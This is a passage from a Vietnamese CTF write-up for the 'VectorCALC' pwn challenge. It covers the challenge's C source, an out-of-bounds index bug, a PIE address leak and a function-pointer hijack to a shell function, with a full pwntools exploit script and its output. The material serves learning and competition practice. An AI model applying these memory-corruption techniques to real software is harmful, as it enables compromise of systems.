</span></span><span style="display:flex;"><span>    __uint64_t idx;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Index: &#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%lu&#34;</span>,<span style="color:#f92672">&amp;</span>idx);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(idx <span style="color:#f92672">&gt;=</span> MAX_FAVES <span style="color:#f92672">||</span> faves[idx] <span style="color:#f92672">==</span> NULL){
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Invaild index!&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    ((<span style="color:#66d9ef">struct</span> Vector <span style="color:#f92672">*</span>)sum)<span style="color:#f92672">-&gt;</span>x <span style="color:#f92672">+=</span> ((<span style="color:#66d9ef">struct</span> Vector <span style="color:#f92672">*</span>)faves[idx])<span style="color:#f92672">-&gt;</span>x;
</span></span><span style="display:flex;"><span>    ((<span style="color:#66d9ef">struct</span> Vector <span style="color:#f92672">*</span>)sum)<span style="color:#f92672">-&gt;</span>y <span style="color:#f92672">+=</span> ((<span style="color:#66d9ef">struct</span> Vector <span style="color:#f92672">*</span>)faves[idx])<span style="color:#f92672">-&gt;</span>y;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">init</span>(){
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">setbuf</span>(stdin,NULL);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">setbuf</span>(stdout,NULL);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(__uint64_t i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> ; i <span style="color:#f92672">&lt;</span> MAX_VECTORS ;<span style="color:#f92672">++</span>i){
</span></span><span style="display:flex;"><span>        v_list[i].printFunc <span style="color:#f92672">=</span> printData;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">printMenu</span>(){
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;1. Enter data.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;2. Sum vector.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;3. Print sum vector</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;4. Save sum to favorite</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;5. Print favorite</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;6. Add favorite to the sum</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;&gt; &#34;</span>
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span><span style="color:#f92672">**</span> argv, <span style="color:#66d9ef">char</span><span style="color:#f92672">**</span> envp){
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">init</span>();
</span></span><span style="display:flex;"><span>    __uint32_t choice ;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span>(<span style="color:#ae81ff">1</span>){
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printMenu</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%u&#34;</span>, <span style="color:#f92672">&amp;</span>choice);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">switch</span> (choice)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">enterData</span>();
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">sumVector</span>();
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">3</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            ((<span style="color:#66d9ef">struct</span> Vector <span style="color:#f92672">*</span>)sum)<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">printFunc</span>(sum);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">4</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">loadFavorite</span>();
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">5</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">printFavorite</span>();
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">6</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">addFavorute</span>();
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Invaild option!&#34;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">w1n</span>(); <span style="color:#75715e">// try to view the code in a disassembler :)
</span></span></span></code></pre></div><p>Ban đầu, dùng checksec() để kiểm tra các chế độ bảo vệ của file:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>─   ~/CTF/wannagame/calc                                                                                                       ✘ INT  31m 0s  03:54:35 ─╮
</span></span><span style="display:flex;"><span>╰─❯ checksec chall                                                                                                                                          ─╯
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/w1n-gl0ry/CTF/wannagame/calc/chall&#39;</span>
</span></span><span style="display:flex;"><span>    Arch:     amd64-64-little
</span></span><span style="display:flex;"><span>    RELRO:    Full RELRO
</span></span><span style="display:flex;"><span>    Stack:    Canary found
</span></span><span style="display:flex;"><span>    NX:       NX enabled
</span></span><span style="display:flex;"><span>    PIE:      PIE enabled
</span></span></code></pre></div><p>:OOPS: , full chế độ được bật :&raquo;&raquo;</p>
<p>Nhìn sơ qua thì ta thấy chương trình khai báo 1 <code>struct Vector</code> có dạng gồm 2 số nguyên không dấu và 1 con trỏ đến hàm nhận tham số kiểu (struct Vector*)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> Vector{
</span></span><span style="display:flex;"><span>__uint64_t x;
</span></span><span style="display:flex;"><span>__uint64_t y;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>printFunc)(<span style="color:#66d9ef">struct</span> Vector<span style="color:#f92672">*</span>);
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div><p>Tiếp tục, mảng <code>v_list</code> chứa tối đa 3 phần tử kiểu <code>Vector</code>, biến con trỏ <code>sum</code> và mảng chứa tối đa 4 con trỏ <code>faves</code></p>
<p>Đến đây thì chưa có gì rõ ràng, ta tiếp tục vào các chức năng chính của chương trình, ta có thể khái quát lại như sau:</p>
<pre><code>Hàm enterData(): Nhập vào index muốn mà mình muốn nhập các chỉ số x, y của struct v , nếu index &gt; 3 -&gt; exit 
Hàm printData(): Dùng để in ra màn hình 2 chỉ số x, y của struct
Hàm sumVector(): Dùng để lưu tổng tất cả các chỉ số x, y (không bao gồm chỉ số của index được chọn), index được chọn sẽ là nơi để lưu tổng của các chỉ số x, y
Hàm loadFavorite(): Nhập vào index của struct mà ta muốn lưu trên heap bằng cách gọi malloc(sizeof(struct Vector)) rồi lưu địa chỉ trên mảng con trỏ faves[index] đã được khai báo đầu chương trình
Hàm printFavorite(): In ra 2 chỉ số x,y trên heap vừa lưu
Hàm addFavorute(): cộng vào 2 chỉ số x, y biến con trỏ sum chứa 1 struct của mảng v_list với 2 chỉ số x, y trên heap tại index mà ta nhập vào
</code></pre>
<p>-&gt; Như đã phân tích trên, chương trình chỉ đơn giản có 6 chức năng, ta tiến hành tìm bug để thực hiện khai thác</p>
<p>Nhìn qua thì có vẻ không có bug gì, nhưng fuzz 1 hồi, mình để ý là ở hàm <code>enterData()</code>, chương trình thực hiện check index của mình nhập vào, nhưng lại không check khi index bằng 3 -&gt; Dẫn tới lỗi OOB, dựa vào đó ta có thể ghi đè biến <code>sum</code> các địa chỉ hợp lí để có thể khai thác</p>
<p>Mình tiến hành debug bằng <code>gdb()</code> để kiểm tra thật sự là mình có thể ghi đè biến sum không, và sau đây là kết quả khi mình nhập index 3:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>09:0048│  0x555555558088 <span style="color:#f92672">(</span>sum<span style="color:#f92672">)</span> ◂— 0xdeadbeef
</span></span><span style="display:flex;"><span>0a:0050│  0x555555558090 ◂— 0xdeadbeef
</span></span><span style="display:flex;"><span>0b:0058│  0x555555558098 —▸ 0x55555555535d <span style="color:#f92672">(</span>printData<span style="color:#f92672">)</span> ◂— endbr64 
</span></span></code></pre></div><p>-&gt; Thật sự, mình có thể ghi đè biến sum, đây là mấu chốt quan trọng để mình thực hiện các bước tiếp theo</p>
<p>Nhưng để viết vào biến <code>sum</code> 1 địa chỉ hợp lệ thì trước hết ta phải cần có địa chỉ base của PIE, và cũng có thể leak địa chỉ libc() base nếu chúng ta không có địa chỉ của hàm nào thật sự exploit được trong binary.</p>
<p>Và may mắn thay, mình tìm thấy trong file binary có hàm <code>w1n()</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">w1n</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/bin/sh 1&gt;/dev/null&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>-&gt; ta không cần phải leak libc và chúng ta có thể điều khiển 1 con trỏ hàm tới đây để có shell :&raquo;&gt;</p>
<p>Vậy, Làm sao để leak PIE??</p>
<p>Sau 1 hồi lâu mò mẫm thì mình cũng tìm được 1 bug khá là hay trong hàm <code>loadFavorite()</code> để có thể leak PIE !</p>
<p>Cùng nhìn lại hàm <code>loadFavorite()</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>faves[idx] <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> Vector));
</span></span><span style="display:flex;"><span>((<span style="color:#66d9ef">struct</span> Vector <span style="color:#f92672">*</span>)faves[idx])<span style="color:#f92672">-&gt;</span>printFunc <span style="color:#f92672">=</span> printData;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memcpy</span>(faves[idx],<span style="color:#f92672">&amp;</span>sum[idx], <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> Vector));
</span></span></code></pre></div><p>Nếu index=2, nếu biến <code>sum</code> đang chứa địa chỉ của struct thứ 2 trong mảng <code>v_list</code> -&gt; <code>&amp;sum[2] -&gt; v_list+64</code> hay là <code>&amp;sum[2]-&gt;v_list[8]</code> và khi thực hiện <code>memcpy()</code> thì trên chunk <code>faves[2]</code> sẽ chứa địa chỉ hàm <code>print</code> trên chỉ số x và địa chỉ của <code>v_list[2]</code> trên chỉ số y của chunk <code>faves[2]</code></p>
<p>Hiện thực hóa điều trên:</p>
<pre tabindex="0"><code>00:0000│  0x555555558040 (v_list) ◂— 0xdeadbeef
01:0008│  0x555555558048 (v_list+8) ◂— 0xdeadbeef
02:0010│  0x555555558050 (v_list+16) —▸ 0x55555555535d (printData) ◂— endbr64 
03:0018│  0x555555558058 (v_list+24) ◂— 0xdeadbeef
04:0020│  0x555555558060 (v_list+32) ◂— 0xdeadbeef
05:0028│  0x555555558068 (v_list+40) —▸ 0x55555555535d (printData) ◂— endbr64 
06:0030│  0x555555558070 (v_list+48) ◂— 0xdeadbeef
07:0038│  0x555555558078 (v_list+56) ◂— 0xdeadbeef
08:0040│  0x555555558080 (v_list+64) —▸ 0x55555555535d (printData) ◂— endbr64 
09:0048│  0x555555558088 (sum) —▸ 0x555555558070 (v_list+48) ◂— 0xdeadbeef
</code></pre><p>-&gt; Trên *faves[2] đã chứa các địa chỉ mà ta cần</p>
<pre tabindex="0"><code>0:0000│  0x5555555592a0 —▸ 0x55555555535d (printData) ◂— endbr64 
01:0008│  0x5555555592a8 —▸ 0x555555558070 (v_list+48) ◂— 0x37ab6fbbc
02:0010│  0x5555555592b0 ◂— 0x0
</code></pre><p>-&gt; Từ đó, khi ta dùng hàm <code>printFavorite()</code> thì thứ chúng ta có được đó là địa chỉ của mảng <code>v_list</code> và địa chỉ của hàm <code>print</code> là ta sẽ có được địa chỉ của PIE</p>
<pre tabindex="0"><code>Index: 2
Data: 
v = [93824992236381 93824992247920]
</code></pre><p>-&gt; Thành công leak được PIE base</p>
<p>Bây giờ, ta đã có PIE base, điều cần làm là làm sao điều khiển được RIP trỏ vào hàm <code>w1n()</code></p>
<p>Options 3 sẽ trả lời câu hỏi của ta:</p>
<p><code>((struct Vector *)sum)-&gt;printFunc(sum);</code></p>
<p>Chúng ta có thể điều khiển biến <code>sum</code> trỏ vào bất cứ đâu nhờ vào bug OOB ở trên</p>
<p>Vậy thì chúng ta sẽ viết hàm <code>w1n()</code> vào 1 index nào đó trên <code>v_list()</code> rồi ghi đè sum trỏ vào trước đó 16 bytes thì chúng ta đã có thể có được shell !!!!!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0000</span><span style="color:#960050;background-color:#1e0010">│</span>  <span style="color:#ae81ff">0x558c60655040</span> (v_list) <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x558c606529d2</span> (w1n) <span style="color:#960050;background-color:#1e0010">◂—</span> endbr64 
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">01</span><span style="color:#f92672">:</span><span style="color:#ae81ff">000</span><span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">│</span>  <span style="color:#ae81ff">0x558c60655048</span> (v_list<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>) <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x558c606529d2</span> (w1n) <span style="color:#960050;background-color:#1e0010">◂—</span> endbr64 
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">02</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0010</span><span style="color:#960050;background-color:#1e0010">│</span>  <span style="color:#ae81ff">0x558c60655050</span> (v_list<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>) <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x558c6065235d</span> (printData) <span style="color:#960050;background-color:#1e0010">◂—</span> endbr64 
</span></span></code></pre></div><p>Lúc này ghi đè sum bằng v_list[3] thành <code>v_list-16</code> sau đó trigger để gọi hàm w1n</p>
<pre tabindex="0"><code>0x558c6065298c &lt;main+173&gt;    call   rdx                           &lt;w1n&gt;
        rdi: 0x558c60655030 (stdin@GLIBC_2.2.5) —▸ 0x7fdff7ff6aa0 (_IO_2_1_stdin_) ◂— 0xfbad208b
        rsi: 0x3
        rdx: 0x558c606529d2 (w1n) ◂— endbr64 
        rcx: 0x0
</code></pre><p>Vậy là trên Local mình đã exploit thành công, mình tiến hành gửi lên server thông qua script sau:
Vector Exploit:
<a href="https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/pwn/VectorCALC/xpl.py">xpl.py</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#context.log_level=&#39;debug&#39;</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">=</span>process(<span style="color:#e6db74">&#39;./chall&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e">#io=remote(&#39;45.122.249.68&#39;, 20017)</span>
</span></span><span style="display:flex;"><span>elf<span style="color:#f92672">=</span>context<span style="color:#f92672">.</span>binary<span style="color:#f92672">=</span>ELF(<span style="color:#e6db74">&#39;./chall&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e">#gdb.attach(io)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">enter</span>(idx, x, y):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>, idx)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Enter x: &#39;</span>, x)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Enter y: &#39;</span>, y)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sumVector</span>(idx):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Save the sum to index: &#39;</span>, idx)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">printsum</span>():
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;3&#39;</span>)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">loadfav</span>(idx):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;4&#39;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index&#39;</span>, idx)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">printfav</span>(idx):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;5&#39;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index&#39;</span>, idx)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">addfav</span>(idx):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;6&#39;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index&#39;</span>, idx)
</span></span><span style="display:flex;"><span>       
</span></span><span style="display:flex;"><span>enter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;0&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>enter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>enter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sumVector(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>loadfav(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>printfav(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;v = [&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>leak<span style="color:#f92672">=</span>io<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)<span style="color:#f92672">.</span>split()
</span></span><span style="display:flex;"><span><span style="color:#75715e"># print(leak)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pie<span style="color:#f92672">=</span>int(leak[<span style="color:#ae81ff">0</span>])<span style="color:#f92672">-</span><span style="color:#ae81ff">0x35d</span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;pie_base :&#39;</span> <span style="color:#f92672">+</span> hex(pie))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v_list<span style="color:#f92672">=</span>int(leak[<span style="color:#ae81ff">1</span>])<span style="color:#f92672">-</span><span style="color:#ae81ff">48</span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;v_list array :&#39;</span> <span style="color:#f92672">+</span> hex(v_list))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sum<span style="color:#f92672">=</span>v_list<span style="color:#f92672">+</span><span style="color:#ae81ff">64</span>
</span></span><span style="display:flex;"><span>faves<span style="color:#f92672">=</span>sum<span style="color:#f92672">+</span><span style="color:#ae81ff">0x18</span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;sum :&#39;</span> <span style="color:#f92672">+</span> hex(sum))
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;faves :&#39;</span> <span style="color:#f92672">+</span> hex(faves))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>w1n<span style="color:#f92672">=</span>pie<span style="color:#f92672">+</span><span style="color:#ae81ff">0x0000000000009D2</span>
</span></span><span style="display:flex;"><span>system<span style="color:#f92672">=</span>pie<span style="color:#f92672">+</span><span style="color:#ae81ff">0x100</span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;w1n :&#39;</span> <span style="color:#f92672">+</span> hex(w1n))
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;system :&#39;</span> <span style="color:#f92672">+</span> hex(system))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>enter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;0&#39;</span>, str(w1n)<span style="color:#f92672">.</span>encode(), str(w1n)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>enter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;3&#39;</span>,str(v_list<span style="color:#f92672">-</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">.</span>encode(), str(v_list<span style="color:#f92672">-</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>printsum() <span style="color:#75715e"># trigger</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#io.sendline(b&#39;exec 1&gt;&amp;0&#39;)</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p>spawn shell &amp; get flag:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>─   ~/CTF/wannagame/calc                                                                                                                       02:52:23 ─╮
</span></span><span style="display:flex;"><span>╰─❯ python3 xpl.py                                                                                                                                          ─╯
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to 45.122.249.68 on port 20017: Done
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/w1n-gl0ry/CTF/wannagame/calc/chall&#39;</span>
</span></span><span style="display:flex;"><span>    Arch:     amd64-64-little
</span></span><span style="display:flex;"><span>    RELRO:    Full RELRO
</span></span><span style="display:flex;"><span>    Stack:    Canary found
</span></span><span style="display:flex;"><span>    NX:       NX enabled
</span></span><span style="display:flex;"><span>    PIE:      PIE enabled
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> pie_base :0x55a8e7c74000
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> v_list array :0x55a8e7c77040
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> sum :0x55a8e7c77080
